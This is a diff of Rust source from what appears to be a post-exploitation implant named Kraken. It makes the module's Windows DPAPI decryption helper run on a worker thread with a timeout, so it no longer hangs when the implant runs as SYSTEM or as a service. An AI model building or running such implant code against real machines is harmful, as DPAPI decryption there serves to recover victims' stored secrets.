@@ -2,19 +2,56 @@
 
 use common::KrakenError;
 
-/// Decrypt data using Windows DPAPI (CryptUnprotectData)
+/// Decrypt data using Windows DPAPI (CryptUnprotectData).
+///
+/// `CryptUnprotectData` can block indefinitely when called from a process
+/// running as SYSTEM or in a non-interactive session (e.g. a Windows service),
+/// because it tries to contact the DPAPI service using the calling thread's
+/// user context, which may not exist or may be unreachable. To prevent the
+/// implant task from hanging, the DPAPI call is executed on a dedicated thread
+/// with a 5-second timeout. If the call does not return within that window the
+/// thread is abandoned and an error is returned immediately.
 #[cfg(windows)]
 pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
-    use windows_sys::Win32::Security::Cryptography::{
-        CryptUnprotectData, CRYPTOAPI_BLOB,
-    };
-    use windows_sys::Win32::System::Memory::LocalFree;
+    use std::sync::mpsc;
+    use std::time::Duration;
 
-    let mut input = CRYPTOAPI_BLOB {
+    // Clone the data so it can be moved into the worker thread safely.
+    let data_owned = data.to_vec();
+
+    let (tx, rx) = mpsc::channel::<Result<Vec<u8>, String>>();
+
+    std::thread::spawn(move || {
+        let result = dpapi_decrypt_inner(&data_owned);
+        // Ignore send errors — the receiver may have timed out and dropped.
+        let _ = tx.send(result);
+    });
+
+    match rx.recv_timeout(Duration::from_secs(5)) {
+        Ok(Ok(plaintext)) => Ok(plaintext),
+        Ok(Err(msg)) => Err(KrakenError::Module(msg)),
+        Err(mpsc::RecvTimeoutError::Timeout) => Err(KrakenError::Module(
+            "DPAPI decryption timed out (non-interactive session or missing user context)".into(),
+        )),
+        Err(mpsc::RecvTimeoutError::Disconnected) => Err(KrakenError::Module(
+            "DPAPI worker thread terminated unexpectedly".into(),
+        )),
+    }
+}
+
+/// Inner DPAPI call executed on a dedicated thread.
+#[cfg(windows)]
+fn dpapi_decrypt_inner(data: &[u8]) -> Result<Vec<u8>, String> {
+    use windows_sys::Win32::Security::Cryptography::{
+        CryptUnprotectData, CRYPT_INTEGER_BLOB,
+    };
+    use windows_sys::Win32::Foundation::LocalFree;
+
+    let mut input = CRYPT_INTEGER_BLOB {
         cbData: data.len() as u32,
         pbData: data.as_ptr() as *mut u8,
     };
-    let mut output = CRYPTOAPI_BLOB {
+    let mut output = CRYPT_INTEGER_BLOB {
         cbData: 0,
         pbData: std::ptr::null_mut(),
     };
@@ -32,7 +69,7 @@ pub fn dpapi_decrypt(data: &[u8]) -> Result<Vec<u8>, KrakenError> {
     };
 
     if ok == 0 {
-        return Err(KrakenError::Module("DPAPI decryption failed".into()));
+        return Err("DPAPI decryption failed".into());
     }
 
     let result = unsafe {
